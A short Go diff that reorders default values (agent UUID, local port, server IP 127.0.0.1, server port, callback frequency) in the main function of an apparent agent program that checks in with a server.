@@ -155,20 +155,20 @@ func (info AgentInfoStruct) printAgentInfo() {
 
 func main() {
 	// Initialize variables if they weren't provide during the build
+	if AgentUUID == "" {
+		AgentUUID = uuid.New().String()
+	}
 	if LocalPortString == "" {
 		LocalPortString = "1337"
 	}
-	if AgentUUID == "" {
-		AgentUUID = uuid.New().String()
+	if ServerIP == "" {
+		ServerIP = "127.0.0.1"
 	}
 	if ServerPortString == "" {
 		ServerPortString = "444"
 	}
 	if CallbackFrequencyMinutesString == "" {
 		CallbackFrequencyMinutesString = "1"
-	}
-	if ServerIP == "" {
-		ServerIP = "127.0.0.1"
 	}
 
 	// Set up variables
